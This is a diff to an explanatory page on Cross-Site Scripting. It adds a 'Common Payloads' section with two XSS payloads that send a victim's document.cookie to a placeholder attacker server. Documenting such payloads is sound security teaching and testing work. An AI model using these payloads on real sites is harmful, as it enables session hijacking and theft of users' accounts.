@@ -13,6 +13,11 @@ Cross-Site Scripting (XSS) attacks occur when:
 Data enters a Web application through an untrusted source, most frequently a web request.
 The data is included in dynamic content that is sent to a web user without being validated for malicious content.
 
+## Common Payloads
+
+	<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
+	<img src=x onerror=fetch("http://<YOUR_SERVER_IP>/"+document.cookie)>
+
 
 ## Relevant Information
 
